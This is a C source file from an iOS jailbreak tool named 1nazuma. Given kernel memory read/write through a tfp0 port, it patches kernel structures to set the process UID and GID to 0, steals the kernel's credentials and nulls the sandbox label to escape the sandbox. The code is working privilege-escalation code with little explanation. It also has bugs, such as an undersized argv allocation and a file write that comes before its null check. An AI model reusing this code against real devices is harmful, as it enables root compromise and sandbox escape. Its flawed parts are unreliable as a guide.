//
//  1nazuma_engine.c
//  1nazuma
//
//  Created by Anthony Viriya on R 1/12/01.
//  Copyright © Reiwa 1 Anthony Viriya. All rights reserved.
//

#include "1nazuma_engine.h"
#include "exploit.h"
#include "offsets.h"
#include "kernel_memory.h"
#include "IOKitLib.h"
#include <mach/mach.h>
#include <sys/mman.h>
#include <spawn.h>
#include "iosurface.h"

uint64_t ucred_field, ucred;
task_port_t tfp0;

uint64_t get_current_task(){
    static uint64_t self = 0;
    if (!self) {
        self = rk64(current_task + 0x358);
        printf("[i] Found current_task at 0x%llx\n", self);
    }
    return self;
}

int privilege_escalation(){
    //https://github.com/jakeajames/jelbrekLib/blob/master/offsetof.c
    unsigned off_ucred_cr_uid = 0x18;
    unsigned off_ucred_cr_ruid = 0x1c;
    unsigned off_ucred_cr_svuid = 0x20;
    unsigned off_ucred_cr_rgid = 0x68;
    unsigned off_ucred_cr_svgid = 0x6c;
    unsigned off_ucred_cr_label = 0x78;
    unsigned off_p_uid = 0x28;
    unsigned off_p_gid = 0x2C;
    unsigned off_p_ruid = 0x30;
    unsigned off_p_rgid = 0x34;
    unsigned off_p_ucred = 0xF8;
    unsigned off_sandbox_slot = 0x10;

    printf("[i] Preparing to elevate own privileges!\n");
    uint64_t selfProc = get_current_task();
    uint64_t creds = rk64(selfProc + off_p_ucred);
    
    printf("[i] Set GID = 0\n");
    // GID
    wk32(selfProc + off_p_gid, 0);
    wk32(selfProc + off_p_rgid, 0);
    wk32(creds + off_ucred_cr_rgid, 0);
    wk32(creds + off_ucred_cr_svgid, 0);
    
    
    printf("[i] Set UID = 0\n");
    creds = rk64(selfProc + off_p_ucred);
    wk32(selfProc + off_p_uid, 0);
    wk32(selfProc + off_p_ruid, 0);
    wk32(creds + off_ucred_cr_uid, 0);
    wk32(creds + off_ucred_cr_ruid, 0);
    wk32(creds + off_ucred_cr_svuid, 0);
    
    
    // Sandbox Escaping
    // https://github.com/jakeajames/jelbrekLib/blob/master/jelbrek.m
    printf("[i] Trying to escape the sandbox\n");
    creds = rk64(selfProc + off_p_ucred);
    uint64_t cr_label = rk64(creds + off_ucred_cr_label);
    // Just in case
    uint64_t orig_sb = rk64(cr_label + off_sandbox_slot);
    wk64(cr_label + off_sandbox_slot, 0);
    seteuid(0);
    
    if (geteuid() == 0) {
        FILE * testfile = fopen("/var/mobile/1nazuma", "w");
        fprintf(testfile, "Jelbrek Achieved with 1nazuma");
            if (!testfile) {
                printf("[i] Sandboxed :(\n");
                return -2; // Sanboxed
            }else {
                printf("[i] O'er the land of the FREEEEEEEEEEEEEE\n");
                printf("[+] Wrote file 1nazuma to /var/mobile/1nazuma successfully!\n");
                return 0; // Free
            }
        
    } else {
        return -1; // No root bitch
    }
    return 0;
}

void exec(const char* path, int argc, ...) {
    printf("[i] Preparing to execute command at path: %s\n", path);
    va_list ap;
    va_start(ap, argc);
    const char ** argv = malloc(argc+2);
    argv[0] = path;
    for (int i = 1; i <= argc; i++) {
        argv[i] = va_arg(ap, const char*);
    }
    va_end(ap);
    argv[argc+1] = NULL;
    posix_spawn(NULL, path, NULL, NULL, (char *const*)argv, NULL);
    free(argv);
    return;
}

static uint64_t kernel_get_proc_for_task(uint64_t task) {
    return rk64(task + 0x358);
}

void kernel_credentials_take_over(uint64_t *ucred_field, uint64_t *ucred) {
    //https://github.com/pwn20wndstuff/Injector/blob/master/kernel_call/user_client.c
    printf("[i] Starting kernel credentials take over\n");
    uint64_t proc_self = kernel_get_proc_for_task(rk64(self_port_addr + 0x68));
    uint64_t kernel_proc = kernel_get_proc_for_task(kern_task_addr);
    printf("[i] Found kernel_proc: 0x%p\n", kernel_proc);
    uint64_t proc_self_ucred_field = proc_self + 0xf8;
    uint64_t kernel_proc_ucred_field = kernel_proc + 0xf8;
    printf("[i] Found kernel_proc_ucred_field: 0x%p\n", kernel_proc_ucred_field);
    uint64_t proc_self_ucred = rk64(proc_self_ucred_field);
    uint64_t kernel_proc_ucred = rk64(kernel_proc_ucred_field);
    wk64(proc_self_ucred_field, kernel_proc_ucred);
    *ucred_field = proc_self_ucred_field;
    *ucred = proc_self_ucred;
    printf("[i] Kernel credentials taken over\n");
}


int start_inazuma_engine(mach_port_t tfpzero){
    printf("[i] Starting Inazuma tfp0-to-root engine\n");
    tfp0 = tfpzero;
    kernel_credentials_take_over(&ucred_field, &ucred);
    return privilege_escalation();
}
